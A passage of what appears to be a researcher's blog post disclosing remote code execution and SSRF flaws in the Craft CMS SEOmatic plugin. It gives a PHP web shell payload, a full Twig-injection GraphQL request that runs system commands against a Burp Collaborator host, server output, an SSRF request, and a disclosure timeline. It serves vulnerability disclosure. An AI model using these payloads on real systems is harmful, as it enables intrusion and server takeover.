+<span class="o">[{</span><span class="s2">&#34;Expires&#34;</span>:1,<span class="s2">&#34;Discard&#34;</span>:false,<span class="s2">&#34;Value&#34;</span>:<span class="s2">&#34;&lt;?php if(isset(</span><span class="nv">$_REQUEST</span><span class="s2">[&#39;cmd&#39;])){ </span><span class="nv">$cmd</span><span class="s2"> = (</span><span class="nv">$_REQUEST</span><span class="s2">[&#39;cmd&#39;]); system(</span><span class="nv">$cmd</span><span class="s2">); }?&gt;\n&#34;</span><span class="o">}]</span>%                                    
+doge in ~/IdeaProjects/GIT/phpggc on master ● ● λ cat data  
+&lt;?php <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])){</span> <span class="nv">$cmd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> system<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span>?&gt;
+doge in ~/phpggc on master ● ● λ 
+
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="remote-code-execution">Remote code execution</h1>
+<p>A few days later I found better way to exploit this vulnerability. As I mentioned earlier method <code>evaluateDynamicContent</code> was disabled at Craft CMS but it was not at <strong>Yii::Base::View</strong>. As you may already know Twig template engine support variables. We can use them to create new <strong>Yii::Base::View</strong> object and call <code>evaluateDynamicContent</code> method directly and bypass protection mechanism. Final exploit will looks like.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">POST /index.php?p=admin/actions/graphql/api HTTP/1.1
+Host: 127.0.0.1:8000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:8000/admin/seomatic/plugin
+X-Requested-With: XMLHttpRequest
+Connection: close
+Cookie: CRAFT_CSRF_TOKEN=65b1642b30dd16579ca51699a3392fc9a24f9802f181a5b0d1998c2f8464c15da%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A208%3A%22nzSA34Nh2-246okgxBRjTXG_qKeqgdezSL2hsKFH%7C0e8798e23345a2260452e8f25ae6cd879da745e39be67e71f9c1734da5eb2048nzSA34Nh2-246okgxBRjTXG_qKeqgdezSL2hsKFH%7C1%7C%242y%2413%24wK%2FYH5krqJrSeROBaQ9jbOjKdpMg2hHqVkwJij8Gb7z6vLkLwzohS%22%3B%7D; 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 262
+
+query=query{seomatic(uri:&#34;{%\nset+dum={\n&#39;class&#39;:&#39;yii\\\\base\\\\View&#39;\n}\n%}{%\nset+dummy=create(dum)\n%}{{\ndummy.evaluateDynamicContent(&#39;echo+system(\\&#39;host+3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net\\&#39;);&#39;)\n}}&#34;){metaTitleContainer,metaTagContainer}}
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">HTTP/1.1 200 OK
+Server: nginx/1.17.3
+Date: Fri, 30 Oct 2020 14:40:37 GMT
+Content-Type: application/json; charset=UTF-8
+Connection: close
+X-Robots-Tag: none
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+X-Powered-By: Craft CMS
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Authorization, Content-Type, X-Craft-Token
+Access-Control-Allow-Origin: *
+Last-Modified: Friday, 30-Oct-2020 14:40:37 UTC
+Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0
+Content-Length: 779
+
+{&#34;data&#34;:{&#34;seomatic&#34;:{&#34;metaTitleContainer&#34;:&#34;<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>🚧 craft<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>&#34;,&#34;metaTagContainer&#34;:&#34;<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">\&#34;generator\&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">\&#34;SEOmatic\&#34;</span><span class="p">&gt;&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">\&#34;referrer\&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">\&#34;no-referrer-when-downgrade\&#34;</span><span class="p">&gt;&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">\&#34;robots\&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">\&#34;none\&#34;</span><span class="p">&gt;&lt;</span><span class="nt">meta</span> <span class="na">content</span><span class="o">=</span><span class="s">\&#34;ru_RU\&#34;</span> <span class="na">property</span><span class="o">=</span><span class="s">\&#34;og:locale\&#34;</span><span class="p">&gt;&lt;</span><span class="nt">meta</span> <span class="na">content</span><span class="o">=</span><span class="s">\&#34;craft\&#34;</span> <span class="na">property</span><span class="o">=</span><span class="s">\&#34;og:site_name\&#34;</span><span class="p">&gt;&lt;</span><span class="nt">meta</span> <span class="na">content</span><span class="o">=</span><span class="s">\&#34;website\&#34;</span> <span class="na">property</span><span class="o">=</span><span class="s">\&#34;og:type\&#34;</span><span class="p">&gt;&lt;</span><span class="nt">meta</span> <span class="na">content</span><span class="o">=</span><span class="s">\&#34;127.0.0.1:8000/3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net</span> <span class="na">has</span> <span class="na">address</span> <span class="na">52</span><span class="err">.</span><span class="na">16</span><span class="err">.</span><span class="na">21</span><span class="err">.</span><span class="na">24</span><span class="err">\</span><span class="na">n3bfekk3h7xxfbjupcfq82qmu0l6cu1</span><span class="err">.</span><span class="na">burpcollaborator</span><span class="err">.</span><span class="na">net</span> <span class="na">mail</span> <span class="na">is</span> <span class="na">handled</span> <span class="na">by</span> <span class="na">1</span> <span class="na">mail</span><span class="err">.</span><span class="na">3bfekk3h7xxfbjupcfq82qmu0l6cu1</span><span class="err">.</span><span class="na">burpcollaborator</span><span class="err">.</span><span class="na">net</span><span class="err">.\</span><span class="na">n3bfekk3h7xxfbjupcfq82qmu0l6cu1</span><span class="err">.</span><span class="na">burpcollaborator</span><span class="err">.</span><span class="na">net</span> <span class="na">mail</span> <span class="na">is</span> <span class="na">handled</span> <span class="na">by</span> <span class="na">1</span> <span class="na">mail</span><span class="err">.</span><span class="na">3bfekk3h7xxfbjupcfq82qmu0l6cu1</span><span class="err">.</span><span class="na">burpcollaborator</span><span class="err">.</span><span class="na">net</span><span class="err">.\&#34;</span> <span class="na">property</span><span class="o">=</span><span class="s">\&#34;og:url\&#34;</span><span class="p">&gt;</span>&#34;}}}
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="images/seomatic-rce.png" alt="Seomatic RCE" title="Seomatic RCE" class="lazyload">
+<figcaption class="image-caption">Seomatic RCE</figcaption></figure>
+</p>
+<h1 id="bonus-server-side-request-forgery">Bonus. Server Side Request Forgery</h1>
+<p>Unauthorized Server Side Request Forgery at Craft CMS Seomatic plugin version before 3.3.15</p>
+<h3 id="details-about-vulnerability">Details about vulnerability</h3>
+<p>Controller FileController allows anonymous access by default. Function looks like:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">        $url = base64_decode($url);
+        $robots = base64_decode($robots);
+        $canonical = base64_decode($canonical);
+        $url = UrlHelper::absoluteUrlWithProtocol($url);
+        $contents = file_get_contents($url);
+        $response = Craft::$app-&gt;getResponse();
+</code></pre></td></tr></table>
+</div>
+</div><p>Url parameter is base64 encoded malicious user host <code>http://3eif8shsnxsuvuyupt9o4bfwnntdh2.burpcollaborator.net/</code> is <code>aHR0cDovLzNlaWY4c2hzbnhzdXZ1eXVwdDlvNGJmd25udGRoMi5idXJwY29sbGFib3JhdG9yLm5ldC8=</code></p>
+<h3 id="step-to-reproduce">Step to reproduce</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">GET /index.php?action=seomatic/file/seo-file-link<span class="err">&amp;</span>url=aHR0cDovLzNlaWY4c2hzbnhzdXZ1eXVwdDlvNGJmd25udGRoMi5idXJwY29sbGFib3JhdG9yLm5ldC8= HTTP/1.1
+Host: 127.0.0.1:8000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:8000/admin/seomatic/plugin
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="images/seomatic-ssrf.png" alt="Seomatic SSRF" title="Seomatic SSRF" class="lazyload">
+<figcaption class="image-caption">Seomatic SSRF</figcaption></figure>
+
+<figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="images/seomatic-ssrf-callback.png" alt="Seomatic SSRF" title="Seomatic SSRF" class="lazyload">
+<figcaption class="image-caption">Seomatic SSRF</figcaption></figure>
+</p>
+<h1 id="timeline">Timeline</h1>
+<ol>
+<li>13 Aug 2020 Vulnerabilities were discovered</li>
+<li>14 Aug 2020 Nystudio107 was informed about the vulnerabilities</li>
+<li>17 Aug 2020 fix released</li>
+<li>CVE-ID to be done</li>
+<li>XX Xxx Public disclosure</li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>The article was updated on 2020-11-06</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/multiple-vulnerabilities-craft-cms-seomatic/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share"><span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/multiple-vulnerabilities-craft-cms-seomatic/" data-title="Multiple vulnerabilities at Craft CMS SEOmatic plugin" data-via="https://twitter.com/d4d89704243" data-hashtags="rce,ssrf,exploit"><i class="fab fa-twitter fa-fw"></i>
+</a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/multiple-vulnerabilities-craft-cms-seomatic/" data-hashtag="rce"><i class="fab fa-facebook-square fa-fw"></i>
+</a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/multiple-vulnerabilities-craft-cms-seomatic/"><i class="fab fa-linkedin fa-fw"></i>
+</a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="/multiple-vulnerabilities-craft-cms-seomatic/" data-title="Multiple vulnerabilities at Craft CMS SEOmatic plugin" data-web><i class="fab fa-whatsapp fa-fw"></i>
+</a><a href="javascript:void(0);" title="Share on Pinterest" data-sharer="pinterest" data-url="/multiple-vulnerabilities-craft-cms-seomatic/" data-description="Remote code execution, Server Side Request Forgery at Craft CMS SEOmatic plugin"><i class="fab fa-pinterest fa-fw"></i>
+</a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="/multiple-vulnerabilities-craft-cms-seomatic/" data-title="Multiple vulnerabilities at Craft CMS SEOmatic plugin"><i class="fab fa-hacker-news fa-fw"></i>
+</a></span></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section><span>
+                        <a href="/tags/rce">
+                            <i class="fas fa-tag fa-fw"></i>rce
+                        </a>
+                    </span>&nbsp;<span>
+                        <a href="/tags/ssrf">
+                            <i class="fas fa-tag fa-fw"></i>ssrf
+                        </a>
+                    </span>&nbsp;<span>
+                        <a href="/tags/exploit">
+                            <i class="fas fa-tag fa-fw"></i>exploit
+                        </a>
+                    </span>&nbsp;</section>
+        <section>
+            <span><a href="javascript:window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/data-processing-libraries-part-two/" class="prev" rel="prev" title="Security of Data processing libraries Part 2"><i class="fas fa-angle-left fa-fw"></i>Security of Data processing libraries Part 2</a></div>
+</div>
+<div class="comment"></div>
+    </article></div>
+            </main><footer class="footer">
+    <div class="copyright"><div class="copyright-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
+        </div>
+
+        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/d4d89704243" target="_blank">d4d</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+    </div>
+</footer>
+</div><a href="#" class="dynamic-to-top animated faster" id="dynamic-to-top">
+            <span>&nbsp;</span>
+        </a><script src="/js/lib/smooth-scroll/smooth-scroll.polyfills.min.js"></script><script src="/js/lib/sharer/sharer.min.js"></script><script src="/js/lib/lazysizes/lazysizes.min.js"></script><script src=/js/theme.min.js></script></body>
+</html>
